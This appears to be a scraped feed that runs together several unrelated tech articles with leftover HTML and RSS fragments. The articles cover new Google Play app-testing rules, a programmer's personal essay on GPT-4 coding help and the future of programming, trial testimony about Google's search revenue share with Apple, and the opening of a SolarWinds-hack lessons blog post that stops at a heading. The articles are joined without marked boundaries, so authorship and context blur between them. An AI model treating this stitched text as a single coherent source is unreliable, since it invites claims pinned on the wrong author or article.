<div id="readability-page-1" class="page"><div>
				<p id="speakable-summary">Google today is <a href="http://android-developers.googleblog.com/2023/11/ensuring-high-quality-apps-on-google-play.html">announcing</a> strengthened protections for Android developers publishing apps to its Google Play store. The changes are a part of Google’s broader efforts at keeping low-quality and unsafe apps out of its app store and off consumers’ devices, which also recently included the launch of a new <a href="https://techcrunch.com/2023/11/04/google-play-android-real-time-app-scanning-sideload-apps/">real-time app scanning feature to combat malicious apps.</a> Today, the company says it will now require new Android developers with personal accounts to test their app with a minimum of 20 people for at least 2 weeks prior to publication. It additionally plans to increase its investment in the app review processes, warning of potential slowdowns in approvals for a small number of apps as these changes roll out.</p>
<p>According to Google, developers that use its testing tools have, on average, 3 times the amount of app installs and user engagement. That, of course, may not be a factor fully attributable to Google’s tools, but to the developers who would utilize such app testing tools before hitting publish. That is, they’re likely developing higher-quality applications. But now, app testing will no longer be optional for developers with newly created Play Console accounts, says Google.</p>
<p>Without providing an exact timeframe, Google says that new developers with individual accounts (as opposed to new Organization accounts) will be required to test apps with 20 people or more for 2 weeks or longer before publishing to production. The company believes this will help developers identify issues and bugs, and gain user feedback before their app’s launch. It says the requirement will arrive in the Play Console in the “coming days.”</p>
<p>Related to this, Google also plans to invest more heavily in its app review process, which, anecdotally, has long been considered to be less stringent than Apple’s with more reliance on automation over human review. Today, Google says its review teams will begin to spend more time assessing new apps to ensure policy compliance and that they don’t defraud users, including within the app or outside the Play Store.</p>
<p>This particular change follows an issue that’s impacted both app stores in India, specifically, where predatory lending apps have targeted financially insecure consumers, and then used unethical tactics to pressure borrowers to pay back debts. Apple <a href="https://techcrunch.com/2023/07/07/apple-purges-predatory-lending-apps-in-india-following-scrutiny/">this summer also had to sweep its App Store of these apps,</a> but Android is more popular in India, which means the issue more <a href="https://techcrunch.com/2022/08/26/loan-apps-abuse-harassment-suicide-indian-users-google-apple-india/">heavily impacts the Play Store.</a></p>
<p>However, Google is also taking aim at apps that ask for elevated permissions with the<a href="https://techcrunch.com/2023/03/08/googles-new-developer-preview-release-of-android-14-focuses-on-privacy-and-security/"> launch of Android 14</a>. With this release, developers can use more granular permission flow options, like asking only to access select photos or videos instead of the entirety of a user’s photo gallery.</p>
<p>As a result of the app review changes, Google warns it may take longer to review “a small portion of apps,” including those that require “certain device permissions” or those aimed at children.</p>
<p>The company announced a few other updates today, as well, including the ability for developers to choose their preferred deadline for meeting <a href="https://android-developers.googleblog.com/2023/07/boosting-trust-and-transparency-in-google-play.html">stricter verification requirements</a> associated with publishing on Google Play. Developers who don’t choose a timeframe before Feb. 29, 2024 will have their deadline set for them, Google says.</p>
<p>It also noted that, in addition to providing users with more information about which apps work well on their devices, and other efforts to highlight local and regional content, Google will add a badge identifying official government apps starting in 2024.</p>

<div id="readability-page-1" class="page"><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>I have always taken it for granted that, just as my parents made sure that I could read and write, I would make sure that my kids could program computers. It is among the newer arts but also among the most essential, and ever more so by the day, encompassing everything from filmmaking to physics. Fluency with code would round out my children’s literacy—and keep them employable. But as I write this my wife is pregnant with our first child, due in about three weeks. I code professionally, but, by the time that child can type, coding as a valuable skill might have faded from the world.</p><p>I first began to believe this on a Friday morning this past summer, while working on a small hobby project. A few months back, my friend Ben and I had resolved to create a <em>Times</em>-style crossword puzzle entirely by computer. In 2018, we’d made a Saturday puzzle with the help of software and were surprised by how little we contributed—just applying our taste here and there. Now we would attempt to build a crossword-making program that didn’t require a human touch.</p><p>When we’ve taken on projects like this in the past, they’ve had both a hardware component and a software component, with Ben’s strengths running toward the former. We once made a neon sign that would glow when the subway was approaching the stop near our apartments. Ben bent the glass and wired up the transformer’s circuit board. I wrote code to process the transit data. Ben has some professional coding experience of his own, but it was brief, shallow, and now about twenty years out of date; the serious coding was left to me. For the new crossword project, though, Ben had introduced a third party. He’d signed up for a ChatGPT Plus subscription and was using GPT-4 as a coding assistant.</p><p>Something strange started happening. Ben and I would talk about a bit of software we wanted for the project. Then, a shockingly short time later, Ben would deliver it himself. At one point, we wanted a command that would print a hundred random lines from a dictionary file. I thought about the problem for a few minutes, and, when thinking failed, tried Googling. I made some false starts using what I could gather, and while I did my thing—programming—Ben told GPT-4 what he wanted and got code that ran perfectly.</p><p>Fine: commands like those are notoriously fussy, and everybody looks them up anyway. It’s not real programming. A few days later, Ben talked about how it would be nice to have an iPhone app to rate words from the dictionary. But he had no idea what a pain it is to make an iPhone app. I’d tried a few times and never got beyond something that half worked. I found Apple’s programming environment forbidding. You had to learn not just a new language but a new program for editing and running code; you had to learn a zoo of “U.I. components” and all the complicated ways of stitching them together; and, finally, you had to figure out how to package the app. The mountain of new things to learn never seemed worth it. The next morning, I woke up to an app in my in-box that did exactly what Ben had said he wanted. It worked perfectly, and even had a cute design. Ben said that he’d made it in a few hours. GPT-4 had done most of the heavy lifting.</p><p>By now, most people have had experiences with A.I. Not everyone has been impressed. Ben recently said, “I didn’t start really respecting it until I started having it write code for me.” I suspect that non-programmers who are skeptical by nature, and who have seen ChatGPT turn out wooden prose or bogus facts, are still underestimating what’s happening.</p><p>Bodies of knowledge and skills that have traditionally taken lifetimes to master are being swallowed at a gulp. Coding has always felt to me like an endlessly deep and rich domain. Now I find myself wanting to write a eulogy for it. I keep thinking of Lee Sedol. Sedol was one of the world’s best Go players, and a national hero in South Korea, but is now best known for losing, in 2016, to a computer program called AlphaGo. Sedol had walked into the competition believing that he would easily defeat the A.I. By the end of the days-long match, he was proud of having eked out a single game. As it became clear that he was going to lose, Sedol said, in a press conference, “I want to apologize for being so powerless.” He retired three years later. Sedol seemed weighed down by a question that has started to feel familiar, and urgent: What will become of this thing I’ve given so much of my life to?</p><p>My first enchantment with computers came when I was about six years old, in Montreal in the early nineties, playing Mortal Kombat with my oldest brother. He told me about some “fatalities”—gruesome, witty ways of killing your opponent. Neither of us knew how to inflict them. He dialled up an FTP server (where files were stored) in an MS-DOS terminal and typed obscure commands. Soon, he had printed out a page of codes—instructions for every fatality in the game. We went back to the basement and exploded each other’s heads.</p><p>I thought that my brother was a hacker. Like many programmers, I dreamed of breaking into and controlling remote systems. The point wasn’t to cause mayhem—it was to find hidden places and learn hidden things. “My crime is that of curiosity,” goes “The Hacker’s Manifesto,” written in 1986 by Loyd Blankenship. My favorite scene from the 1995 movie “Hackers” is when Dade Murphy, a newcomer, proves himself at an underground club. Someone starts pulling a rainbow of computer books out of a backpack, and Dade recognizes each one from the cover: the green book on international Unix environments; the red one on N.S.A.-trusted networks; the one with the pink-shirted guy on I.B.M. PCs. Dade puts his expertise to use when he turns on the sprinkler system at school, and helps right the ballast of an oil tanker—all by tap-tapping away at a keyboard. The lesson was that knowledge is power.</p><p>But how do you actually learn to hack? My family had settled in New Jersey by the time I was in fifth grade, and when I was in high school I went to the Borders bookstore in the Short Hills mall and bought “Beginning Visual C++,” by Ivor Horton. It ran to twelve hundred pages—my first grimoire. Like many tutorials, it was easy at first and then, suddenly, it wasn’t. Medieval students called the moment at which casual learners fail the <em>pons asinorum</em>, or “bridge of asses.” The term was inspired by Proposition 5 of Euclid’s Elements I, the first truly difficult idea in the book. Those who crossed the bridge would go on to master geometry; those who didn’t would remain dabblers. Section 4.3 of “Beginning Visual C++,” on “Dynamic Memory Allocation,” was my bridge of asses. I did not cross.</p><p>But neither did I drop the subject. I remember the moment things began to turn. I was on a long-haul flight, and I’d brought along a boxy black laptop and a CD-<em>ROM</em> with the Borland C++ compiler. A compiler translates code you write into code that the machine can run; I had been struggling for days to get this one to work. By convention, every coder’s first program does nothing but generate the words “Hello, world.” When I tried to run my version, I just got angry error messages. Whenever I fixed one problem, another cropped up. I had read the “Harry Potter” books and felt as if I were in possession of a broom but had not yet learned the incantation to make it fly. Knowing what might be possible if I did, I kept at it with single-minded devotion. What I learned was that programming is not really about knowledge or skill but simply about patience, or maybe obsession. Programmers are people who can endure an endless parade of tedious obstacles. Imagine explaining to a simpleton how to assemble furniture over the phone, with no pictures, in a language you barely speak. Imagine, too, that the only response you ever get is that you’ve suggested an absurdity and the whole thing has gone awry. All the sweeter, then, when you manage to get something assembled. I have a distinct memory of lying on my stomach in the airplane aisle, and then hitting Enter one last time. I sat up. The computer, for once, had done what I’d told it to do. The words “Hello, world” appeared above my cursor, now in the computer’s own voice. It seemed as if an intelligence had woken up and introduced itself to me.</p><p>Most of us never became the kind of hackers depicted in “Hackers.” To “hack,” in the parlance of a programmer, is just to tinker—to express ingenuity through code. I never formally studied programming; I just kept messing around, making computers do helpful or delightful little things. In my freshman year of college, I knew that I’d be on the road during the third round of the 2006 Masters Tournament, when Tiger Woods was moving up the field, and I wanted to know what was happening in real time. So I made a program that scraped the leaderboard on pgatour.com and sent me a text message anytime he birdied or bogeyed. Later, after reading “Ulysses” in an English class, I wrote a program that pulled random sentences from the book, counted their syllables, and assembled haikus—a more primitive regurgitation of language than you’d get from a chatbot these days, but nonetheless capable, I thought, of real poetry:</p><blockquote><p>I’ll flay him alive<br>Uncertainly he waited<br>Heavy of the past</p></blockquote></div><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>I began taking coding seriously. I offered to do programming for a friend’s startup. The world of computing, I came to learn, is vast but organized almost geologically, as if deposited in layers. From the Web browser down to the transistor, each sub-area or system is built atop some other, older sub-area or system, the layers dense but legible. The more one digs, the more one develops what the race-car driver Jackie Stewart called “mechanical sympathy,” a sense for the machine’s strengths and limits, of what one could make it do.</p><p>At my friend’s company, I felt my mechanical sympathy developing. In my sophomore year, I was watching “Jeopardy!” with a friend when he suggested that I make a playable version of the show. I thought about it for a few hours before deciding, with much disappointment, that it was beyond me. But when the idea came up again, in my junior year, I could see a way through it. I now had a better sense of what one could do with the machine. I spent the next fourteen hours building the game. Within weeks, playing “Jimbo Jeopardy!” had become a regular activity among my friends. The experience was profound. I could understand why people poured their lives into craft: there is nothing quite like watching someone enjoy a thing you’ve made.</p><p>In the midst of all this, I had gone full “Paper Chase” and begun ignoring my grades. I worked voraciously, just not on my coursework. One night, I took over a half-dozen machines in a basement computer lab to run a program in parallel. I laid printouts full of numbers across the floor, thinking through a pathfinding algorithm. The cost was that I experienced for real that recurring nightmare in which you show up for a final exam knowing nothing of the material. (Mine was in Real Analysis, in the math department.) In 2009, during the most severe financial crisis in decades, I graduated with a 2.9 G.P.A.</p><p>And yet I got my first full-time job easily. I had work experience as a programmer; nobody asked about my grades. For the young coder, these were boom times. Companies were getting into bidding wars over top programmers. Solicitations for experienced programmers were so aggressive that they complained about “recruiter spam.” The popularity of university computer-science programs was starting to explode. (My degree was in economics.) Coding “boot camps” sprang up that could credibly claim to turn beginners into high-salaried programmers in less than a year. At one of my first job interviews, in my early twenties, the C.E.O. asked how much I thought I deserved to get paid. I dared to name a number that faintly embarrassed me. He drew up a contract on the spot, offering ten per cent more. The skills of a “software engineer” were vaunted. At one company where I worked, someone got in trouble for using HipChat, a predecessor to Slack, to ask one of my colleagues a question. “Never HipChat an engineer directly,” he was told. We were too important for that.</p></div><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>This was an era of near-zero interest rates and extraordinary tech-sector growth. Certain norms were established. Companies like Google taught the industry that coders were to have free espresso and catered hot food, world-class health care and parental leave, on-site gyms and bike rooms, a casual dress code, and “twenty-per-cent time,” meaning that they could devote one day a week to working on whatever they pleased. Their skills were considered so crucial and delicate that a kind of superstition developed around the work. For instance, it was considered foolish to estimate how long a coding task might take, since at any moment the programmer might turn over a rock and discover a tangle of bugs. Deadlines were anathema. If the pressure to deliver ever got too intense, a coder needed only to speak the word “burnout” to buy a few months.</p><p>From the beginning, I had the sense that there was something wrongheaded in all this. Was what we did really so precious? How long could the boom last? In my teens, I had done a little Web design, and, at the time, that work had been in demand and highly esteemed. You could earn thousands of dollars for a project that took a weekend. But along came tools like Squarespace, which allowed pizzeria owners and freelance artists to make their own Web sites just by clicking around. For professional coders, a tranche of high-paying, relatively low-effort work disappeared.</p><figure><p><span><div data-attr-viewport-monitor=""><a data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://www.newyorker.com/cartoon/a27287&quot;}" href="https://www.newyorker.com/cartoon/a27287" rel="nofollow noopener" target="_blank"><picture></picture></a><p><span>“I should have known he has absolutely no morals—I’ve seen how he loads a dishwasher.”</span></p><p><span>Cartoon by Hartley Lin</span></p></div></span></p></figure><p>The response from the programmer community to these developments was just, Yeah, you have to keep levelling up your skills. Learn difficult, obscure things. Software engineers, as a species, love automation. Inevitably, the best of them build tools that make other kinds of work obsolete. This very instinct explained why we were so well taken care of: code had immense leverage. One piece of software could affect the work of millions of people. Naturally, this sometimes displaced programmers themselves. We were to think of these advances as a tide coming in, nipping at our bare feet. So long as we kept learning we would stay dry. Sound advice—until there’s a tsunami.</p><p>When we were first allowed to use A.I. chatbots at work, for programming assistance, I studiously avoided them. I expected that my colleagues would, too. But soon I started seeing the telltale colors of an A.I. chat session—the zebra pattern of call-and-response—on programmers’ screens as I walked to my desk. A common refrain was that these tools made you more productive; in some cases, they helped you solve problems ten times faster.</p><p>I wasn’t sure I wanted that. I enjoy the act of programming and I like to feel useful. The tools I’m familiar with, like the text editor I use to format and to browse code, serve both ends. They enhance my practice of the craft—and, though they allow me to deliver work faster, I still feel that I deserve the credit. But A.I., as it was being described, seemed different. It provided a <em>lot</em> of help. I worried that it would rob me of both the joy of working on puzzles and the satisfaction of being the one who solved them. I could be infinitely productive, and all I’d have to show for it would be the products themselves.</p><p>The actual work product of most programmers is rarely exciting. In fact, it tends to be almost comically humdrum. A few months ago, I came home from the office and told my wife about what a great day I’d had wrestling a particularly fun problem. I was working on a program that generated a table, and someone had wanted to add a header that spanned more than one column—something that the custom layout engine we’d written didn’t support. The work was urgent: these tables were being used in important documents, wanted by important people. So I sequestered myself in a room for the better part of the afternoon. There were lots of lovely sub-problems: How should I allow users of the layout engine to convey that they want a column-spanning header? What should <em>their</em> code look like? And there were fiddly details that, if ignored, would cause bugs. For instance, what if one of the columns that the header was supposed to span got dropped because it didn’t have any data? I knew it was a good day because I had to pull out pen and pad—I was drawing out possible scenarios, checking and double-checking my logic.</p></div><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>But taking a bird’s-eye view of what happened that day? A table got a new header. It’s hard to imagine anything more mundane. For me, the pleasure was entirely in the process, not the product. And what would become of the process if it required nothing more than a three-minute ChatGPT session? Yes, our jobs as programmers involve many things besides literally writing code, such as coaching junior hires and designing systems at a high level. But coding has always been the root of it. Throughout my career, I have been interviewed and selected precisely for my ability to solve fiddly little programming puzzles. Suddenly, this ability was less important.</p><p>I had gathered as much from Ben, who kept telling me about the spectacular successes he’d been having with GPT-4. It turned out that it was not only good at the fiddly stuff but also had the qualities of a senior engineer: from a deep well of knowledge, it could suggest ways of approaching a problem. For one project, Ben had wired a small speaker and a red L.E.D. light bulb into the frame of a portrait of King Charles, the light standing in for the gem in his crown; the idea was that when you entered a message on an accompanying Web site the speaker would play a tune and the light would flash out the message in Morse code. (This was a gift for an eccentric British expat.) Programming the device to fetch new messages eluded Ben; it seemed to require specialized knowledge not just of the microcontroller he was using but of Firebase, the back-end server technology that stored the messages. Ben asked me for advice, and I mumbled a few possibilities; in truth, I wasn’t sure that what he wanted would be possible. Then he asked GPT-4. It told Ben that Firebase had a capability that would make the project much simpler. Here it was—and here was some code to use that would be compatible with the microcontroller.</p><p>Afraid to use GPT-4 myself—and feeling somewhat unclean about the prospect of paying OpenAI twenty dollars a month for it—I nonetheless started probing its capabilities, via Ben. We’d sit down to work on our crossword project, and I’d say, “Why don’t you try prompting it this way?” He’d offer me the keyboard. “No, you drive,” I’d say. Together, we developed a sense of what the A.I. could do. Ben, who had more experience with it than I did, seemed able to get more out of it in a stroke. As he later put it, his own neural network had begun to align with GPT-4’s. I would have said that he had achieved mechanical sympathy. Once, in a feat I found particularly astonishing, he had the A.I. build him a Snake game, like the one on old Nokia phones. But then, after a brief exchange with GPT-4, he got it to modify the game so that when you lost it would show you how far you strayed from the most efficient route. It took the bot about ten seconds to achieve this. It was a task that, frankly, I was not sure I could do myself.</p></div><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>In chess, which for decades now has been dominated by A.I., a player’s only hope is pairing up with a bot. Such half-human, half-A.I. teams, known as centaurs, might still be able to beat the best humans and the best A.I. engines working alone. Programming has not yet gone the way of chess. But the centaurs have arrived. GPT-4 on its own is, for the moment, a worse programmer than I am. Ben is much worse. But Ben plus GPT-4 is a dangerous thing.</p><p>It wasn’t long before I caved. I was making a little search tool at work and wanted to highlight the parts of the user’s query that matched the results. But I was splitting up the query by words in a way that made things much more complicated. I found myself short on patience. I started thinking about GPT-4. Perhaps instead of spending an afternoon programming I could spend some time “prompting,” or having a conversation with an A.I.</p><p>In a 1978 essay titled “On the Foolishness of ‘Natural Language Programming,’&nbsp;” the computer scientist Edsger&nbsp;W. Dijkstra argued that if you were to instruct computers not in a specialized language like C++ or Python but in your native tongue you’d be rejecting the very precision that made computers useful. Formal programming languages, he wrote, are “an amazingly effective tool for ruling out all sorts of nonsense that, when we use our native tongues, are almost impossible to avoid.” Dijkstra’s argument became a truism in programming circles. When the essay made the rounds on Reddit in 2014, a top commenter wrote, “I’m not sure which of the following is scariest. Just how trivially obvious this idea is” or the fact that “many still do not know it.”</p><p>When I first used GPT-4, I could see what Dijkstra was talking about. You can’t just say to the A.I., “Solve my problem.” That day may come, but for now it is more like an instrument you must learn to play. You have to specify what you want carefully, as though talking to a beginner. In the search-highlighting problem, I found myself asking GPT-4 to do too much at once, watching it fail, and then starting over. Each time, my prompts became less ambitious. By the end of the conversation, I wasn’t talking about search or highlighting; I had broken the problem into specific, abstract, unambiguous sub-problems that, together, would give me what I wanted.</p><p>Having found the A.I.’s level, I felt almost instantly that my working life had been transformed. Everywhere I looked I could see GPT-4-size holes; I understood, finally, why the screens around the office were always filled with chat sessions—and how Ben had become so productive. I opened myself up to trying it more often.</p><p>I returned to the crossword project. Our puzzle generator printed its output in an ugly text format, with lines like <code>"s""c""a""r""*""k""u""n""i""s""*" "a""r""e""a"</code>. I wanted to turn output like that into a pretty Web page that allowed me to explore the words in the grid, showing scoring information at a glance. But I knew the task would be tricky: each letter had to be tagged with the words it belonged to, both the across and the down. This was a detailed problem, one that could easily consume the better part of an evening. With the baby on the way, I was short on free evenings. So I began a conversation with GPT-4. Some back-and-forth was required; at one point, I had to read a few lines of code myself to understand what it was doing. But I did little of the kind of thinking I once believed to be constitutive of coding. I didn’t think about numbers, patterns, or loops; I didn’t use my mind to simulate the activity of the computer. As another coder, Geoffrey Litt, wrote after a similar experience, “I never engaged my detailed programmer brain.” So what <em>did</em> I do?</p><p>Perhaps what pushed Lee Sedol to retire from the game of Go was the sense that the game had been forever cheapened. When I got into programming, it was because computers felt like a form of magic. The machine gave you powers but required you to study its arcane secrets—to learn a spell language. This took a particular cast of mind. I felt selected. I devoted myself to tedium, to careful thinking, and to the accumulation of obscure knowledge. Then, one day, it became possible to achieve many of the same ends without the thinking and without the knowledge. Looked at in a certain light, this can make quite a lot of one’s working life seem like a waste of time.</p><p>But whenever I think about Sedol I think about chess. After machines conquered that game, some thirty years ago, the fear was that there would be no reason to play it anymore. Yet chess has never been more popular—A.I. has enlivened the game. A friend of mine picked it up recently. At all hours, he has access to an A.I. coach that can feed him chess problems just at the edge of his ability and can tell him, after he’s lost a game, exactly where he went wrong. Meanwhile, at the highest levels, grandmasters study moves the computer proposes as if reading tablets from the gods. Learning chess has never been easier; studying its deepest secrets has never been more exciting.</p><p>Computing is not yet overcome. GPT-4 is impressive, but a layperson can’t wield it the way a programmer can. I still feel secure in my profession. In fact, I feel somewhat more secure than before. As software gets easier to make, it’ll proliferate; programmers will be tasked with its design, its configuration, and its maintenance. And though I’ve always found the fiddly parts of programming the most calming, and the most essential, I’m not especially good at them. I’ve failed many classic coding interview tests of the kind you find at Big Tech companies. The thing I’m relatively good at is knowing what’s worth building, what users like, how to communicate both technically and humanely. A friend of mine has called this A.I. moment “the revenge of the so-so programmer.” As coding per se begins to matter less, maybe softer skills will shine.</p><p>That still leaves open the matter of what to teach my unborn child. I suspect that, as my child comes of age, we will think of “the programmer” the way we now look back on “the computer,” when that phrase referred to a person who did calculations by hand. Programming by typing C++ or Python yourself might eventually seem as ridiculous as issuing instructions in binary onto a punch card. Dijkstra would be appalled, but getting computers to do precisely what you want might become a matter of asking politely.</p><p>So maybe the thing to teach isn’t a skill but a spirit. I sometimes think of what I might have been doing had I been born in a different time. The coders of the agrarian days probably futzed with waterwheels and crop varietals; in the Newtonian era, they might have been obsessed with glass, and dyes, and timekeeping. I was reading an oral history of neural networks recently, and it struck me how many of the people interviewed—people born in and around the nineteen-thirties—had played with radios when they were little. Maybe the next cohort will spend their late nights in the guts of the A.I.s their parents once regarded as black boxes. I shouldn’t worry that the era of coding is winding down. Hacking is forever.&nbsp;♦</p></div></div>]]></description>

<p>Google's default search deal with Apple is worth so much to the search giant that Google pays 36 percent of its search advertising revenue from Safari to keep its search engine set as the default in Apple's browser, <a href="https://www.bloomberg.com/news/articles/2023-11-13/apple-gets-36-of-google-revenue-from-search-deal-witness-says">Bloomberg reported</a>.</p>
<p>Google and Apple objected to making this key detail public from their long-running default search deal. But their closely held secret came out on Monday during testimony from Google's main economics expert, Kevin Murphy, during the Department of Justice's monopoly trial examining Google's search business.</p>
<p>"Probably the biggest slip of the entire trial," Big Tech on Trial, an account dedicated to providing updates from the Google trial, <a href="https://twitter.com/BigTechOnTrial/status/1724136578593718643">posted</a> on X (formerly Twitter).</p>
<p><a href="https://news.bloomberglaw.com/ip-law/apple-gets-36-of-google-revenue-from-search-deal-witness-says">According to Bloomberg Law</a>, Google attorney John Schmidtlein "visibly cringed" when Murphy revealed the confidential information, which Google had initially claimed needed to be kept secret because otherwise it “would unreasonably undermine Google’s competitive standing in relation to both competitors and other counterparties.”</p>
<p>For the DOJ—which has made the <a href="https://arstechnica.com/tech-policy/2023/10/googles-21-year-deal-with-apple-is-the-heart-of-monopoly-case-judge-says/">Google-Apple deal the center of its case</a> alleging that Google maintains an illegal monopoly over search—this detail confirms how valuable default placements on iPhones are to the search leader.</p>
<p>The DOJ has argued that Google pays so much for default search deals to block out competitors, lock search users into its services, and maintain a stronghold over the search industry—a dominant position that could be further entrenched by Google's advances with AI, <a href="https://arstechnica.com/tech-policy/2023/10/googles-claim-that-search-users-have-choice-is-bogus-microsoft-ceo-tells-judge/">Microsoft CEO Satya Nadella testified</a>. In September, an Apple exec testified that the default deal between Google and Apple was seemingly so lucrative that it even <a href="https://arstechnica.com/tech-policy/2023/09/google-deal-may-have-kept-apple-from-building-search-engine-exec-says/">stopped Apple from creating its own rival search engine</a>.</p>
<p>It's still unclear exactly how much money that portion of Google's search advertising revenue that comes from Safari amounts to, but several estimates have been floated.&nbsp;<a href="https://www.statista.com/statistics/266249/advertising-revenue-of-google/">Statista reported</a> that Google's advertising revenue was $224 billion in 2022, and based on that, <a href="https://www.engadget.com/google-reportedly-pays-apple-36-percent-of-ad-search-revenues-from-safari-191730783.html?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAAHZ16G_-rr-pYMpU363ol3cjwErVsOs8lLJgDiRDyapIyCOWFIcEGVZaEmYnPdiIiEKA24pt-r2TWndowKJ-SZiX46kzYXKgmx4w9faq6ioIdOm1USMSKC6MdQjB5sBOGI9MEL7agKiYmW6X7iKhzjvstWsVlYRSl5gSH1wbsqBJ">Engadget estimated</a> that Apple likely gets paid in the tens of billions of dollars for Google's default Safari placements.</p>                                            
                                                        
<p>Previously, sources <a href="https://www.nytimes.com/2023/10/26/technology/google-apple-search-spotlight.html">told The New York Times</a> that Google paid Apple approximately $18 billion in 2021 for the deal, but the exact amount of revenue sharing remained unknown until Monday. The DOJ's trial also recently revealed that <a href="https://arstechnica.com/tech-policy/2023/10/google-paid-26b-for-default-contracts-in-2021-google-exec-testified/">Google paid $26 billion in total for default contracts</a>, which&nbsp;are ostensibly responsible for driving up its search advertising revenue that is right now rapidly climbing. Google's global ad revenue will likely reach nearly $340 billion by 2027, Statista <a href="https://www.statista.com/statistics/539447/google-global-net-advertising-revenues/">reported</a>, driven largely by Google's search engine traffic, which is currently responsible for "roughly 38 percent" of its global ad revenue.</p>
<p>In total, across all those default deals, Digital Content Next CEO Jason Kint estimated in a <a href="https://twitter.com/jason_kint/status/1724152525538959850">post</a> on X that it's possible that Google derives "at least $90 billion of its current annual revenue."</p>
<p>Last month, Google CEO <a href="https://arstechnica.com/tech-policy/2023/10/doj-grilled-sundar-pichai-on-very-valuable-default-deals-deleted-chats/">Sundar Pichai testified</a> that default deals "can make a difference" and can be "very valuable" if "done correctly" but maintained Google's chief defense that partners like Apple enter these deals with Google because Google has a superior search engine.</p>
<p>If the DOJ proves that these default deals ensure that Google maintains an illegal monopoly in general search markets, Google could be ordered to break up its search business, shifting not just Google's bottom line but also its partners, like Apple.</p>
<p>While the trial resumes for another week, Google continues profiting off the deals. From 2022 to 2023, Google's ad revenue increased by $5 billion, <a href="https://searchengineland.com/google-search-ad-revenue-q2-2023-433633">Search Engine Land reported</a>, and seemingly as Nadella predicted, Pichai attributed these gains to AI-driven innovations across Google products, including search.</p>
<p>"We’re continuing to focus on making AI more helpful for everyone; there’s exciting progress and lots more to come,” Pichai said in a statement reported by Search Engine Land.</p>
<p>Judge Amit Mehta, presiding over the antitrust trial, has said that the Google-Apple default deal is the <a href="https://arstechnica.com/tech-policy/2023/10/googles-21-year-deal-with-apple-is-the-heart-of-monopoly-case-judge-says/">"heart" of the DOJ's case against Google</a>. With each new detail revealed about how much Google is willing to pay Apple to maintain their deal, the DOJ hopes to convince Mehta that the deal gives Google an unfair advantage over competitors. This week's slip-up from one of Google's witnesses threatens to disrupt the narrative that Google is trying to build as it winds down its defense of that deal and others.</p>
<p>Mehta is not expected to issue a ruling in the case until 2024.</p>

            <description><![CDATA[<p>URL: <a href="https://www.macchaffee.com/blog/2023/solarwinds-hack-lessons-learned/">https://www.macchaffee.com/blog/2023/solarwinds-hack-lessons-learned/</a>, See on <a href="https://news.ycombinator.com/item?id=38255923">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
        <p>Back in 2020, A Russian state-sponsored group got into SolarWinds' build system and inserted  command and control (c2) code into a routine software update for a network monitoring tool called Orion (<a href="https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach">wiki link</a>). It was all over the news, and for good reason given the extent of the breach (into particularly sensitive parts of the US government) and the lengthy recovery process <a href="https://www.businessinsider.com/russia-hack-may-take-years-undo-bossert-2020-12">which will likely take years</a>. Given its high profile, I'm shocked to report that I feel very little has been learned from that attack.</p>
<p>To me, the hack was a wake-up call about how the way we install and run software is insecure by design and needs a rework, maybe using <a href="https://en.wikipedia.org/wiki/Capability-based_security">capabilities-based security</a>. But all I hear about is a bunch of solutions that kinda miss the point. Let's go over all of those first.</p>
<h2 id="we-should-sign-and-verify-all-our-dependencies">"We should sign and verify all our dependencies"</h2>
<p>In the wake of the SolarWinds hack, interest in "securing the software supply chain" grew considerably, including <a href="https://www.nist.gov/itl/executive-order-14028-improving-nations-cybersecurity">a May 2021 executive order</a> telling NIST/CISA to develop some guidelines about the subject. The <a href="https://slsa.dev/">Supply-chain Levels for Software Artifacts (SLSA)</a> framework also launched that same year and has been steadily growing in popularity.</p>
<p>Don't get me wrong: I appreciate the extra interest in this area. However, the fact remains that malicious code can be signed and verified too, depending on how deeply in the supply chain the attackers are. And they can get pretty deep with state-sponsored cyber criminal skills. Anything could happen in the background of your CI worker (or your laptop) between when you execute <code>git checkout &lt;tag&gt;</code> and <code>make</code>. Any checksums you generate or check can be modified right before you check them. Or maybe your <code>/usr/local/bin/sha256sum</code> has been tampered with. The list goes on.</p>
<p>When we're talking about getting all major open source projects (which have little to no funding) to add enough security to resist nation-states (which have plenty of funding), the math simply doesn't add it.</p>
<h2 id="we-should-disable-automatic-updates">"We should disable automatic updates"</h2>
<p>Automatic updates are a tradeoff, I'll grant that. You are trusting a vendor to not ship a bad update in exchange for getting security fixes ASAP. However, just think for half a second about how the SolarWinds hack worked. The attackers snuck some code into an <em>opaque, propriety, binary blob that <a href="https://en.wikipedia.org/wiki/2020_United_States_federal_government_data_breach#SolarWinds_exploit">lied dormant for 12-14 days</a> before doing anything strange</em>. There is absolutely no way we can perform a full binary analysis of every new version of every binary blob that powers modern IT.</p>
<p>Automating updates are generally recommended because it "helps to ensure the
timeliness and completeness of system patching operations", as mentioned in <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r5.pdf">NIST 800-53§3.19</a>. If you do have the time for manual reviews AND audits that the manual updates have been applied, that's preferable, but obviously that takes a lot of time. For everything else, automation keeps you safer. The SolarWinds hack changed nothing about that calculus.</p>
<h2 id="we-should-deploy-another-agent-to-detect-these-kinds-of-hacks">"We should deploy another agent to detect these kinds of hacks"</h2>
